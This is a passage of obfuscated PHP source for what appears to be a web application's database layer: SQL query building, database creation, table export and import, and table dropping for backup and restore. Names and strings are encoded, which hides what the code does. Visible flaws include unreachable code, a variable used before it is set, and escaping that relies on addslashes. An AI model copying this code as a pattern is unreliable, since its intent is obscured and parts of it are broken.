$this->parseKey($½¥˜Ù); $Îåş¬[] = $this->parseValue($æŒëÜúƒ); } } $ñöƒÄ” = ($ˆ¯‚ş¶¢ ? $ªÄ‡ğ‚ˆ[995] : $ªÄ‡ğ‚ˆ[996]) . $ªÄ‡ğ‚ˆ[997] . $this->parseTable($ÅÓ‡÷Âš[$ªÄ‡ğ‚ˆ[358]]) . $ªÄ‡ğ‚ˆ[991] . implode($ªÄ‡ğ‚ˆ[50], $Ë½Û¨š) . $ªÄ‡ğ‚ˆ[992] . implode($ªÄ‡ğ‚ˆ[50], $Îåş¬) . $ªÄ‡ğ‚ˆ[993]; $ñöƒÄ” .= $this->parseLock(isset($ÅÓ‡÷Âš[$ªÄ‡ğ‚ˆ[933]]) ? $ÅÓ‡÷Âš[$ªÄ‡ğ‚ˆ[933]] : !1); $ñöƒÄ” .= $this->parseComment(!empty($ÅÓ‡÷Âš[$ªÄ‡ğ‚ˆ[431]]) ? $ÅÓ‡÷Âš[$ªÄ‡ğ‚ˆ[431]] : $ªÄ‡ğ‚ˆ[12]); return $this->execute($ñöƒÄ”, $this->parseBind(!empty($ÅÓ‡÷Âš[$ªÄ‡ğ‚ˆ[362]]) ? $ÅÓ‡÷Âš[$ªÄ‡ğ‚ˆ[362]] : array())); } public function selectInsert($…”®—İ, $ÌŒà´Ûé, $åª…àô = array()) { $úÎ¨å¤ =& $_SERVER[¡¬ıÜ ƒ]; $this->model = $åª…àô[$úÎ¨å¤[360]]; if (is_string($…”®—İ)) { $…”®—İ = explode($úÎ¨å¤[50], $…”®—İ); } array_walk($…”®—İ, array($this, $úÎ¨å¤[994])); $ÚªıŞ²È = $úÎ¨å¤[1128] . $this->parseTable($ÌŒà´Ûé) . $úÎ¨å¤[991] . implode($úÎ¨å¤[50], $…”®—İ) . $úÎ¨å¤[1106]; $ÚªıŞ²È .= $this->buildSelectSql($åª…àô); return $this->execute($ÚªıŞ²È, $this->parseBind(!empty($åª…àô[$úÎ¨å¤[362]]) ? $åª…àô[$úÎ¨å¤[362]] : array())); } public function update($©çÑ³ËÒ, $°Â«ã) { $…Ï¡áØÈ =& $_SERVER[¡¬ıÜ ƒ]; $this->model = $°Â«ã[$…Ï¡áØÈ[360]]; $•…è¨›ç = $…Ï¡áØÈ[1129] . $this->parseTable($°Â«ã[$…Ï¡áØÈ[358]]) . $this->parseSet($©çÑ³ËÒ) . $this->parseWhere(!empty($°Â«ã[$…Ï¡áØÈ[354]]) ? $°Â«ã[$…Ï¡áØÈ[354]] : $…Ï¡áØÈ[12]) . $this->parseOrder(!empty($°Â«ã[$…Ï¡áØÈ[443]]) ? $°Â«ã[$…Ï¡áØÈ[443]] : $…Ï¡áØÈ[12]) . $this->parseLimit(!empty($°Â«ã[$…Ï¡áØÈ[369]]) ? $°Â«ã[$…Ï¡áØÈ[369]] : $…Ï¡áØÈ[12]) . $this->parseLock(isset($°Â«ã[$…Ï¡áØÈ[933]]) ? $°Â«ã[$…Ï¡áØÈ[933]] : !1) . $this->parseComment(!empty($°Â«ã[$…Ï¡áØÈ[431]]) ? $°Â«ã[$…Ï¡áØÈ[431]] : $…Ï¡áØÈ[12]); return $this->execute($•…è¨›ç, $this->parseBind(!empty($°Â«ã[$…Ï¡áØÈ[362]]) ? $°Â«ã[$…Ï¡áØÈ[362]] : array())); } public function delete($å²ïÒÏ = array()) { $‘ˆÒŞØ÷ =& $_SERVER[¡¬ıÜ ƒ]; $this->model = $å²ïÒÏ[$‘ˆÒŞØ÷[360]]; $¬ÔÏœ–ô = $‘ˆÒŞØ÷[1130] . $this->parseTable($å²ïÒÏ[$‘ˆÒŞØ÷[358]]) . $this->parseWhere(!empty($å²ïÒÏ[$‘ˆÒŞØ÷[354]]) ? $å²ïÒÏ[$‘ˆÒŞØ÷[354]] : $‘ˆÒŞØ÷[12]) . $this->parseOrder(!empty($å²ïÒÏ[$‘ˆÒŞØ÷[443]]) ? $å²ïÒÏ[$‘ˆÒŞØ÷[443]] : $‘ˆÒŞØ÷[12]) . $this->parseLimit(!empty($å²ïÒÏ[$‘ˆÒŞØ÷[369]]) ? $å²ïÒÏ[$‘ˆÒŞØ÷[369]] : $‘ˆÒŞØ÷[12]) . $this->parseLock(isset($å²ïÒÏ[$‘ˆÒŞØ÷[933]]) ? $å²ïÒÏ[$‘ˆÒŞØ÷[933]] : !1) . $this->parseComment(!empty($å²ïÒÏ[$‘ˆÒŞØ÷[431]]) ? $å²ïÒÏ[$‘ˆÒŞØ÷[431]] : $‘ˆÒŞØ÷[12]); return $this->execute($¬ÔÏœ–ô, $this->parseBind(!empty($å²ïÒÏ[$‘ˆÒŞØ÷[362]]) ? $å²ïÒÏ[$‘ˆÒŞØ÷[362]] : array())); } public function select($ËØúŒ¾ı = array()) { $ŠïÛå¾ƒ =& $_SERVER[¡¬ıÜ ƒ]; $this->model = $ËØúŒ¾ı[$ŠïÛå¾ƒ[360]]; $Ğñ‘°Åù = $this->buildSelectSql($ËØúŒ¾ı); $¹Åâ¼²® = isset($ËØúŒ¾ı[$ŠïÛå¾ƒ[426]]) ? $ËØúŒ¾ı[$ŠïÛå¾ƒ[426]] : !1; if ($¹Åâ¼²®) { $¥¨ô«Æ¯ = is_string($¹Åâ¼²®[$ŠïÛå¾ƒ[97]]) ? $¹Åâ¼²®[$ŠïÛå¾ƒ[97]] : $ŠïÛå¾ƒ[1131] . md5($Ğñ‘°Åù); $ï›—¯¯Æ = think_cache($¥¨ô«Æ¯, $ŠïÛå¾ƒ[12], $¹Åâ¼²®); if (!1 !== $ï›—¯¯Æ) { return $ï›—¯¯Æ; } } $Ùˆ²ï¯À = $this->query($Ğñ‘°Åù, $this->parseBind(!empty($ËØúŒ¾ı[$ŠïÛå¾ƒ[362]]) ? $ËØúŒ¾ı[$ŠïÛå¾ƒ[362]] : array())); if ($¹Åâ¼²® && !1 !== $Ùˆ²ï¯À) { think_cache($¥¨ô«Æ¯, $Ùˆ²ï¯À, $¹Åâ¼²®); } return $Ùˆ²ï¯À; } public function buildSelectSql($š…Û°¸ = array()) { $©Ğ¿Š³ =& $_SERVER[¡¬ıÜ ƒ]; if (isset($š…Û°¸[$©Ğ¿Š³[430]])) { if (strpos($š…Û°¸[$©Ğ¿Š³[430]], $©Ğ¿Š³[50])) { list($¶„ûÁô, $–¾ÌÏÁ¾) = explode($©Ğ¿Š³[50], $š…Û°¸[$©Ğ¿Š³[430]]); } else { $¶„ûÁô = $š…Û°¸[$©Ğ¿Š³[430]]; } $¶„ûÁô = $¶„ûÁô ? $¶„ûÁô : 1; $–¾ÌÏÁ¾ = isset($–¾ÌÏÁ¾) ? $–¾ÌÏÁ¾ : (is_numeric($š…Û°¸[$©Ğ¿Š³[369]]) ? $š…Û°¸[$©Ğ¿Š³[369]] : 20); $Û÷©—€¬ = $–¾ÌÏÁ¾ * ((int) $¶„ûÁô - 1); $š…Û°¸[$©Ğ¿Š³[369]] = $Û÷©—€¬ . $©Ğ¿Š³[50] . $–¾ÌÏÁ¾; } if (think_config($©Ğ¿Š³[1132])) { $š†èû¯Ì = $©Ğ¿Š³[1133] . md5(serialize($š…Û°¸)); $û¢à†Ç = think_cache($š†èû¯Ì); if ($û¢à†Ç) { return $û¢à†Ç; } } $Ÿ‡Ì€¸ = $this->parseSql($this->selectSql, $š…Û°¸); $Ÿ‡Ì€¸ .= $this->parseLock(isset($š…Û°¸[$©Ğ¿Š³[933]]) ? $š…Û°¸[$©Ğ¿Š³[933]] : !1); if (isset($š†èû¯Ì)) { think_cache($š†èû¯Ì, $Ÿ‡Ì€¸); } return $Ÿ‡Ì€¸; } public function parseSql($şÁ•üâŒ, $“ÎÙÇşİ = array()) { $¸ÂûÄÖ =& $_SERVER[¡¬ıÜ ƒ]; $şÁ•üâŒ = str_replace(array($¸ÂûÄÖ[1134], $¸ÂûÄÖ[1135], $¸ÂûÄÖ[1136], $¸ÂûÄÖ[1137], $¸ÂûÄÖ[1138], $¸ÂûÄÖ[1139], $¸ÂûÄÖ[1140], $¸ÂûÄÖ[1141], $¸ÂûÄÖ[1142], $¸ÂûÄÖ[1143], $¸ÂûÄÖ[1144]), array($this->parseTable("{$“ÎÙÇşİ[$¸ÂûÄÖ[358]]}"), $this->parseDistinct(isset($“ÎÙÇşİ[$¸ÂûÄÖ[1145]]) ? $“ÎÙÇşİ[$¸ÂûÄÖ[1145]] : !1), $this->parseField(!empty($“ÎÙÇşİ[$¸ÂûÄÖ[352]]) ? $“ÎÙÇşİ[$¸ÂûÄÖ[352]] : $¸ÂûÄÖ[222]), $this->parseJoin(!empty($“ÎÙÇşİ[$¸ÂûÄÖ[361]]) ? $“ÎÙÇşİ[$¸ÂûÄÖ[361]] : $¸ÂûÄÖ[12]), $this->parseWhere(!empty($“ÎÙÇşİ[$¸ÂûÄÖ[354]]) ? $“ÎÙÇşİ[$¸ÂûÄÖ[354]] : $¸ÂûÄÖ[12]), $this->parseGroup(!empty($“ÎÙÇşİ[$¸ÂûÄÖ[580]]) ? $“ÎÙÇşİ[$¸ÂûÄÖ[580]] : $¸ÂûÄÖ[12]), $this->parseHaving(!empty($“ÎÙÇşİ[$¸ÂûÄÖ[1146]]) ? $“ÎÙÇşİ[$¸ÂûÄÖ[1146]] : $¸ÂûÄÖ[12]), $this->parseOrder(!empty($“ÎÙÇşİ[$¸ÂûÄÖ[443]]) ? $“ÎÙÇşİ[$¸ÂûÄÖ[443]] : $¸ÂûÄÖ[12]), $this->parseLimit(!empty($“ÎÙÇşİ[$¸ÂûÄÖ[369]]) ? $“ÎÙÇşİ[$¸ÂûÄÖ[369]] : $¸ÂûÄÖ[12]), $this->parseUnion(!empty($“ÎÙÇşİ[$¸ÂûÄÖ[424]]) ? $“ÎÙÇşİ[$¸ÂûÄÖ[424]] : $¸ÂûÄÖ[12]), $this->parseComment(!empty($“ÎÙÇşİ[$¸ÂûÄÖ[431]]) ? $“ÎÙÇşİ[$¸ÂûÄÖ[431]] : $¸ÂûÄÖ[12])), $şÁ•üâŒ); return $şÁ•üâŒ; } public function getLastSql($ÛÂü–Ùİ = '') { return $ÛÂü–Ùİ ? $this->modelSql[$ÛÂü–Ùİ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ö’µÚøè) { return addslashes($ö’µÚøè); } public function setModel($†³‰«Ç‡) { $this->model = $†³‰«Ç‡; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($î™”Ÿ× = array()) { $›ÀÈ®ÚØ =& $_SERVER[¡¬ıÜ ƒ]; if (empty($î™”Ÿ×)) { $î™”Ÿ× = $GLOBALS[$›ÀÈ®ÚØ[6]][$›ÀÈ®ÚØ[21]]; } $this->database = $î™”Ÿ×; } public function model($òéûªøæ = '') { return new ModelBase($òéûªøæ, $_SERVER[¡¬ıÜ ƒ][12], $this->database); } public function db($µ’ÒÚ÷¡ = false) { $îíĞ•Â =& $_SERVER[¡¬ıÜ ƒ]; $’»›º Ò = array_change_key_case($this->database); if ($this->dbType() == $îíĞ•Â[13] || !$µ’ÒÚ÷¡) { return $this->model()->db(); } $Äğù¢“ê = $’»›º Ò[$îíĞ•Â[1060]]; $’»›º Ò[$îíĞ•Â[1060]] = $îíĞ•Â[12]; if ($’»›º Ò[$îíĞ•Â[1055]] == $îíĞ•Â[1052]) { $µ•—Ë²ï = $’»›º Ò[$îíĞ•Â[1061]]; $’»›º Ò[$îíĞ•Â[1061]] = substr($µ•—Ë²ï, 0, strrpos($µ•—Ë²ï, $îíĞ•Â[1147])); } $this->database = $’»›º Ò; $³åöÒ¯í = $this->model()->db(); try { $·íµï³ñ = $³åöÒ¯í->execute("\x73\150\157\x77\x20\144\141\164\x61\x62\141\163\145\163\40\154\x69\153\x65\x20\47{$Äğù¢“ê}\47"); } catch (Exception $¿£µâ÷ä) { } if (!$·íµï³ñ) { $³åöÒ¯í->execute("\x63\x72\145\141\164\145\40\144\141\x74\x61\142\141\163\145\40\140{$Äğù¢“ê}\x60"); } $’»›º Ò[$îíĞ•Â[1060]] = $Äğù¢“ê; if ($’»›º Ò[$îíĞ•Â[1055]] == $îíĞ•Â[1052]) { $’»›º Ò[$îíĞ•Â[1061]] .= $îíĞ•Â[1147] . $Äğù¢“ê; } $this->database = $’»›º Ò; $³åöÒ¯í->execute("\x75\163\x65\40\140{$Äğù¢“ê}\140"); return $³åöÒ¯í; } public function createTable($ĞÛ¼¾­, &$ŞĞ®ØŞà) { $Ğ–œºà =& $_SERVER[¡¬ıÜ ƒ]; if (!IO::exist($ĞÛ¼¾­)) { ActionCall($Ğ–œºà[1148], !0, 0); show_json(LNG($Ğ–œºà[1149]), !1); } $÷ì°şŠı = $this->model()->db(); $Ôüí§–´ = sqlSplit(IO::getContent($ĞÛ¼¾­)); foreach ($Ôüí§–´ as $­ñªÎá¡) { $Ÿ­­İåú = stripos($­ñªÎá¡, $Ğ–œºà[1150]) === 0; if ($Ÿ­­İåú) { $ŞĞ®ØŞà->task[$Ğ–œºà[1151]] += 1; } $÷ì°şŠı->execute($­ñªÎá¡); if ($Ÿ­­İåú) { preg_match($Ğ–œºà[1152], $­ñªÎá¡, $¸„«‚ã¦); $ŞĞ®ØŞà->task[$Ğ–œºà[1153]] = $¸„«‚ã¦[1]; $ŞĞ®ØŞà->update(1); } } } public function insertTable($âØ³õƒ, &$†öïÅ—) { $§à¯â†Ú =& $_SERVER[¡¬ıÜ ƒ]; $¬±Õ÷öÁ = $this->model()->db(); $õ­‚¨¶¿ = $·¢Ôœ» ? array($·¢Ôœ») : $¬±Õ÷öÁ->getTables(); foreach ($âØ³õƒ as $£ö¨È‹) { $·¢Ôœ» = basename($£ö¨È‹, $§à¯â†Ú[877]); if (!in_array($·¢Ôœ», $õ­‚¨¶¿)) { continue; } $†öïÅ—->task[$§à¯â†Ú[1153]] = $·¢Ôœ»; if (get_filesize($£ö¨È‹) == 0) { continue; } $±²Ì¸Š = $this->sqlToDb($£ö¨È‹, $†öïÅ—); if (!$±²Ì¸Š) { ActionCall($§à¯â†Ú[1148], !0, 0); show_json(LNG($§à¯â†Ú[1154]) . "\x5b{$·¢Ôœ»}\x5d", !1); } } } public function sqlFromDb($µ©¡êå, $ÜîÉ®ô, &$–æ„çÙ, $§³¥Ü©± = '') { if ($–æ„çÙ) { $–æ„çÙ->task[$_SERVER[¡¬ıÜ ƒ][1153]] = $µ©¡êå; } $ˆßâ„† = $this->model($µ©¡êå); $×—¤àŠŒ = 0; $ÆßóÂºË = 0; $ùç¹€¢… = 10000; $íÍ»ãé£ = fopen($ÜîÉ®ô, $_SERVER[¡¬ıÜ ƒ][1155]); $ÚáÁ®Ú¥ = $ˆßâ„†->getPk(); $â±•«±õ = $ˆßâ„†->getDbFields(); $İ²¿ä¬Ğ = $_SERVER[¡¬ıÜ ƒ][12]; if ($GLOBALS[$_SERVER[¡¬ıÜ ƒ][876]] && in_array($µ©¡êå, array($_SERVER[¡¬ıÜ ƒ][1156], $_SERVER[¡¬ıÜ ƒ][1157]))) { $İ²¿ä¬Ğ = $µ©¡êå; } do { $ÌÄÊÅªß = array($ÚáÁ®Ú¥ => array($_SERVER[¡¬ıÜ ƒ][1102], $ÆßóÂºË)); $Êı®ÎÆÒ = $ˆßâ„†->where($ÌÄÊÅªß)->field($â±•«±õ)->order($ÚáÁ®Ú¥ . $_SERVER[¡¬ıÜ ƒ][1158])->limit($ùç¹€¢…)->select(); $Êı®ÎÆÒ = !empty($Êı®ÎÆÒ) ? $Êı®ÎÆÒ : array(); if (!($ââ˜¿‹· = count($Êı®ÎÆÒ))) { break; } $ë«ÑõÄ» = end($Êı®ÎÆÒ); $ÆßóÂºË = $ë«ÑõÄ»[$ÚáÁ®Ú¥]; $ÇõÁß¦ = array(); foreach ($Êı®ÎÆÒ as $–ú»øíà) { if ($İ²¿ä¬Ğ) { if ($µ©¡êå == $_SERVER[¡¬ıÜ ƒ][1156]) { if ($–ú»øíà[$_SERVER[¡¬ıÜ ƒ][33]] == $_SERVER[¡¬ıÜ ƒ][1159]) { $î––‰İ“ = json_decode($–ú»øíà[$_SERVER[¡¬ıÜ ƒ][452]], !0); if ($î––‰İ“[$_SERVER[¡¬ıÜ ƒ][32]] == $GLOBALS[$_SERVER[¡¬ıÜ ƒ][876]] && $î––‰İ“[$_SERVER[¡¬ıÜ ƒ][830]] != 1) { continue; } } } else { if ($–ú»øíà[$_SERVER[¡¬ıÜ ƒ][33]] == $_SERVER[¡¬ıÜ ƒ][1160] && $–ú»øíà[$_SERVER[¡¬ıÜ ƒ][97]] == $_SERVER[¡¬ıÜ ƒ][871]) { continue; } } } if ($§³¥Ü©±) { $–ú»øíà[$_SERVER[¡¬ıÜ ƒ][87]] = "\173\x69\x6f\x3a{$§³¥Ü©±}\175" . substr($–ú»øíà[$_SERVER[¡¬ıÜ ƒ][87]], strlen("\x7b\x69\x6f\x3a{$–ú»øíà[$_SERVER[¡¬ıÜ ƒ][907]]}\x7d")); $–ú»øíà[$_SERVER[¡¬ıÜ ƒ][907]] = $§³¥Ü©±; } $ÇõÁß¦[] = $_SERVER[¡¬ıÜ ƒ][1161] . $this->sqlEncode($–ú»øíà) . $_SERVER[¡¬ıÜ ƒ][1162]; } $Œö¡¹Ô = "\x49\x4e\123\105\122\124\x20\111\116\124\x4f\x20\x60{$µ©¡êå}\140\x20\50\x60" . implode($_SERVER[¡¬ıÜ ƒ][1163], $â±•«±õ) . $_SERVER[¡¬ıÜ ƒ][1164]; fwrite($íÍ»ãé£, $Œö¡¹Ô . implode($_SERVER[¡¬ıÜ ƒ][1165], $ÇõÁß¦) . $_SERVER[¡¬ıÜ ƒ][74] . PHP_EOL); $×—¤àŠŒ += $ââ˜¿‹·; if ($–æ„çÙ) { $–æ„çÙ->update($ââ˜¿‹·); } } while ($ùç¹€¢… == $ââ˜¿‹·); fclose($íÍ»ãé£); return $×—¤àŠŒ; } public function sqlToDb($£©Û§¬, &$Ñ“—á†ä) { $äÂÔÛÔö =& $_SERVER[¡¬ıÜ ƒ]; $ù›Øæ»û = $this->model()->db(); $˜Ş‘©£ = @fopen($£©Û§¬, $äÂÔÛÔö[1166]); if (!$˜Ş‘©£) { return !1; } $¼µÉËĞ’ = 0; $–×´Å‰µ = $äÂÔÛÔö[12]; $â¶ï·ÛÕ = array(); $¶ù¬’ö‹ = $this->dbType(); $–¦ôÈ·â = $¶ù¬’ö‹ == $äÂÔÛÔö[13] ? 500 : 2000; $ÆˆØÃ¬Ğ = basename($£©Û§¬, $äÂÔÛÔö[877]); $ï—ïçÒ– = 0; $°šñÁ¸ = 4194304; while (!feof($˜Ş‘©£)) { $öæö¦¡Ø = trim(fgets($˜Ş‘©£)); if (!$öæö¦¡Ø) { continue; } $õõ¾ìàã = $this->sqlDecode($öæö¦¡Ø, $¶ù¬’ö‹, $ÆˆØÃ¬Ğ); if (stripos($õõ¾ìàã, $äÂÔÛÔö[432]) === 0) { if (!$–×´Å‰µ) { $–×´Å‰µ = $õõ¾ìàã . $äÂÔÛÔö[53]; } continue; } if ($Ñ“—á†ä) { $Ñ“—á†ä->task[$äÂÔÛÔö[1151]] += 1; } $¼µÉËĞ’++; $â¶ï·ÛÕ[] = rtrim(rtrim(trim($õõ¾ìàã), $äÂÔÛÔö[50]), $äÂÔÛÔö[74]); $öıØåÌ = null; $”éÎ°¹Ñ = strlen($õõ¾ìàã); $ï—ïçÒ– += $”éÎ°¹Ñ; $ş‹ŒóùÑ = strlen($–×´Å‰µ) + $ï—ïçÒ– + (count($â¶ï·ÛÕ) - 1); if ($ş‹ŒóùÑ >= $°šñÁ¸) { $öıØåÌ = array_pop($â¶ï·ÛÕ); if ($¼µÉËĞ’ > 1) { $¼µÉËĞ’--; } } if ($¼µÉËĞ’ >= $–¦ôÈ·â || $öıØåÌ) { $õõ¾ìàã = $–×´Å‰µ . implode($äÂÔÛÔö[50], $â¶ï·ÛÕ); if (!$ù›Øæ»û->execute($õõ¾ìàã)) { return !1; } if ($Ñ“—á†ä) { $Ñ“—á†ä->update($¼µÉËĞ’); } $â¶ï·ÛÕ = array(); $¼µÉËĞ’ = 0; $ï—ïçÒ– = 0; if ($öıØåÌ) { $â¶ï·ÛÕ = array($öıØåÌ); $¼µÉËĞ’ = 1; $ï—ïçÒ– = $”éÎ°¹Ñ; } } } fclose($˜Ş‘©£); if (!empty($â¶ï·ÛÕ)) { $õõ¾ìàã = $–×´Å‰µ . implode($äÂÔÛÔö[50], $â¶ï·ÛÕ); if (!$ù›Øæ»û->execute($õõ¾ìàã)) { return !1; } if ($Ñ“—á†ä) { $Ñ“—á†ä->update($¼µÉËĞ’); } } return !0; } public function dropTable($Ïîİ•îª = null) { $÷õ„ûÏş = $this->model()->db(); $ÁŸ†—¼¯ = $Ïîİ•îª ? array($Ïîİ•îª) : $÷õ„ûÏş->getTables(); if (!$ÁŸ†—¼¯) { return; } foreach ($ÁŸ†—¼¯ as $Ïîİ•îª) { if ($Ïîİ•îª) { $Ïîİ•îª = strtolower($Ïîİ•îª); } else { continue; } $÷õ„ûÏş->execute("\144\162\157\160\40\x74\x61\142\x6c\x65\x20\151\146\40\145\x78\151\x73\x74\163\x20\x60{$Ïîİ•îª}\x60"); } } private function sqlEncode($ÎÕö˜â…) { $‘˜ÛšçÛ =& $_SERVER[¡¬ıÜ ƒ]; $‹Ïª£†ô = array(); foreach ($ÎÕö˜â… as $»¤¦ËÇğ) { if (is_array($»¤¦ËÇğ)) { $»¤¦ËÇğ = json_encode_force($»¤¦ËÇğ); } $»¤¦ËÇğ = addslashes($»¤¦ËÇğ); $»¤¦ËÇğ = str_replace(array($‘˜ÛšçÛ[1167], $‘˜ÛšçÛ[287], $‘˜ÛšçÛ[419]), array($‘˜ÛšçÛ[1168], $‘˜ÛšçÛ[1169], $‘˜ÛšçÛ[1170]), $»¤¦ËÇğ); $‹Ïª£†ô[] = $»¤¦ËÇğ; } return $‘˜ÛšçÛ[58] . implode($‘˜ÛšçÛ[1171], $‹Ïª£†ô) . $‘˜ÛšçÛ[58]; } private function sqlDecode($¹±íŸˆ¼, $¶ÃšĞ­¯, $Äµã¯Ãò = '') { $ô®Àšì =& $_SERVER[¡¬ıÜ ƒ]; $¹±íŸˆ¼ = str_replace(array($ô®Àšì[1168], $ô®Àšì[1169], $ô®Àšì[1170]), array($ô®Àšì[1167], $ô®Àšì[287], $ô®Àšì[419]), $¹±íŸˆ¼); if ($¶ÃšĞ­¯ == $ô®Àšì[13]) { $¹±íŸˆ¼ = str_ireplace($ô®Àšì[1172], $ô®Àšì[59], $¹±íŸˆ¼); $¹±íŸˆ¼ = stripslashes($¹±íŸˆ¼); } return preg_replace($ô®Àšì[1173], $ô®Àšì[12], $¹±íŸˆ¼); if ($¶ÃšĞ­¯ == $ô®Àšì[13]) { return $Äµã¯Ãò != $ô®Àšì[870] ? stripslashes($¹±íŸˆ¼) : $¹±íŸˆ¼; } if ($Äµã¯Ãò == $ô®Àšì[870]) { $¹±íŸˆ¼ = str_replace($ô®Àšì[1174], $ô®Àšì[121], stripslashes($¹±íŸˆ¼)); } return $¹±íŸˆ¼; } public function getSqlFile($Üªû¢Ò¯ = '') { $–÷åæúö =& $_SERVER[¡¬ıÜ ƒ]; $¶“Ğñùò = $this->dbType(!0); $¾·ãùØ‚ = CONTROLLER_DIR . "\x69\156\163\x74\x61\x6c\x6c\57\144\x61\164\141\57{$¶“Ğñùò}\56\x73\x71\154"; $®å€ÂâÂ = file_get_contents($¾·ãùØ‚); $ÇÇ¾éÖ¼ = $–÷åæúö[1175] . ($¶“Ğñùò == $–÷åæúö[894] ? $–÷åæúö[1176] : $–÷åæúö[1177]) . $–÷åæúö[1178]; preg_match_all($ÇÇ¾éÖ¼, $®å€ÂâÂ, $ÓÆ¦§¤†); $À³òúãè = $ÓÆ¦§¤†[1]; $İİŸ°êú = $this->model()->db(); $ˆü¥ Òü = $İİŸ°êú->getTables(); $óùå›‹ü = TEMP_FILES . $–÷åæúö[1179] . date($–÷åæúö[261]) . $–÷åæúö[8]; del_dir($óùå›‹ü); mk_dir($óùå›‹ü); $ÔĞî² = $óùå›‹ü . $–÷åæúö[1180]; $Ö‘”ãŒê = $óùå›‹ü . $–÷åæúö[1181]; $½¤ŸµÜ¢ = $¶“Ğñùò == $–÷åæúö[13] ? $–÷åæúö[894] : $–÷åæúö[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\163\164\141\154\154\57\x64\x61\x74\x61\57{$½¤ŸµÜ¢}\x2e\163\x71\154", $óùå›‹ü); @touch($óùå›‹ü . $¶“Ğñùò . $–÷åæúö[877]); $ª°í¤¬ù = fopen($ÔĞî², $–÷åæúö[1155]); $ÉÔÆƒñŠ = fopen($Ö‘”ãŒê, $–÷åæúö[1155]); if ($¶“Ğñùò == $–÷åæúö[13]) { $ˆü¥ Òü = array_diff($ˆü¥ Òü, array($–÷åæúö[868], $–÷åæúö[869])); $·†€’Ó¥ = array($–÷åæúö[1182], $–÷åæúö[1183], $–÷åæúö[1184]); fwrite($ÉÔÆƒñŠ, implode(PHP_EOL, $·†€’Ó¥) . PHP_EOL . PHP_EOL); foreach ($ˆü¥ Òü as $úÓáÖ¤µ) { $ËöÄµ = $this->sqlFromSqlite($úÓáÖ¤µ); if (!$ËöÄµ[$–÷åæúö[13]]) { continue; } fwrite($ÉÔÆƒñŠ, $ËöÄµ[$–÷åæúö[13]] . PHP_EOL . PHP_EOL); if (!in_array($úÓáÖ¤µ, $À³òúãè)) { fwrite($ª°í¤¬ù, $ËöÄµ[$–÷åæúö[894]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ˆü¥ Òü as $úÓáÖ¤µ) { $ËöÄµ = $this->sqlFromMysql($úÓáÖ¤µ); if (!$ËöÄµ[$–÷åæúö[894]]) { continue; } fwrite($ª°í¤¬ù, $ËöÄµ[$–÷åæúö[894]] . PHP_EOL . PHP_EOL); if (!in_array($úÓáÖ¤µ, $À³òúãè)) { fwrite($ÉÔÆƒñŠ, $ËöÄµ[$–÷åæúö[13]] . PHP_EOL . PHP_EOL); } } } fclose($ª°í¤¬ù); fclose($ÉÔÆƒñŠ); $®å€ÂâÂ = array($–÷åæúö[894] => $ÔĞî², $–÷åæúö[13] => $Ö‘”ãŒê); return $Üªû¢Ò¯ ? $®å€ÂâÂ[$Üªû¢Ò¯] : $®å€ÂâÂ; } public function dbType($£Ö¢òª™ = false) { $´İ·—Ä =& $_SERVER[¡¬ıÜ ƒ]; $¿ÁÉÇ®Û = $£Ö¢òª™ ? $GLOBALS[$´İ·—Ä[6]][$´İ·—Ä[21]] : $this->database; $¿ÁÉÇ®Û = array_change_key_case($¿ÁÉÇ®Û); $÷ºœ öƒ = $¿ÁÉÇ®Û[$´İ·—Ä[1055]]; if ($÷ºœ öƒ == $´İ·—Ä[1052]) { $‚“Ü²©õ = explode($´İ·—Ä[4], $¿ÁÉÇ®Û[$´İ·—Ä[1061]]); $÷ºœ öƒ = $‚“Ü²©õ[0]; } $®Æ¾­Ë = array($´İ·—Ä[1185] => $´İ·—Ä[13], $´İ·—Ä[1000] => $´İ·—Ä[894]); if (isset($®Æ¾­Ë[$÷ºœ öƒ])) { $÷ºœ öƒ = $®Æ¾­Ë[$÷ºœ öƒ]; } return $÷ºœ öƒ; } public function sqlFromMysql($íËØ·š©, $Äô˜ÃŸ = '') { $ğÊ¾Ï´ =& $_SERVER[¡¬ıÜ ƒ]; $âøÀİæù = $this->model()->db(); $¿µµğ€ü = $âøÀİæù->query($ğÊ¾Ï´[1186] . $íËØ·š© . $ğÊ¾Ï´[463]); if (!$¿µµğ€ü || !$¿µµğ€ü[0]) { return !1; } $’À«Æ § = _get($¿µµğ€ü[0], $ğÊ¾Ï´[1187], $ğÊ¾Ï´[12]); if (!$’À«Æ §) { return !1; } $Å³­ß¯Â = "\104\122\117\x50\x20\124\x41\102\x4c\105\40\x49\106\40\x45\x58\111\x53\124\123\40\140{$íËØ·š©}\x60\73" . PHP_EOL . $’À«Æ § . $ğÊ¾Ï´[74]; if ($Äô˜ÃŸ && $Äô˜ÃŸ == $ğÊ¾Ï´[894]) { return $Å³­ß¯Â; } $¸«Ü—¡° = array_change_key_case($GLOBALS[$ğÊ¾Ï´[6]][$ğÊ¾Ï´[21]]); $Š¯Ü×²³ = $¸«Ü—¡°[$ğÊ¾Ï´[1060]]; $´–«×ï = $ğÊ¾Ï´[1188] . $Š¯Ü×²³ . $ğÊ¾Ï´[1189] . $íËØ·š© . $ğÊ¾Ï´[58]; $‡°šü¢ò = $ğÊ¾Ï´[1190] . $íËØ·š© . $ğÊ¾Ï´[988]; $ƒø·Îƒñ = $âøÀİæù->query($´–«×ï); if (empty($ƒø·Îƒñ)) { $Õ™»ş–¶ = array($ğÊ¾Ï´[894] => $ğÊ¾Ï´[12], $ğÊ¾Ï´[13] => $ğÊ¾Ï´[12]); return $Äô˜ÃŸ ? $Õ™»ş–¶[$Äô˜ÃŸ] : $Õ™»ş–¶; } $ƒæ–Ñ¢ = $âøÀİæù->query($‡°šü¢ò); $É´§é’ä = $ğÊ¾Ï´[12]; $Éä…— = array(); foreach ($ƒæ–Ñ¢ as $¡İ²ğ˜Î) { if (!$É´§é’ä && $¡İ²ğ˜Î[$ğÊ¾Ï´[1191]] == $ğÊ¾Ï´[1192]) { $É´§é’ä = $¡İ²ğ˜Î[$ğÊ¾Ï´[1193]]; } if (isset($Éä…—[$¡İ²ğ˜Î[$ğÊ¾Ï´[1191]]])) { $Éä…—[$¡İ²ğ˜Î[$ğÊ¾Ï´[1191]]][$ğÊ¾Ï´[1194]][] = $¡İ²ğ˜Î[$ğÊ¾Ï´[1193]]; continue; } 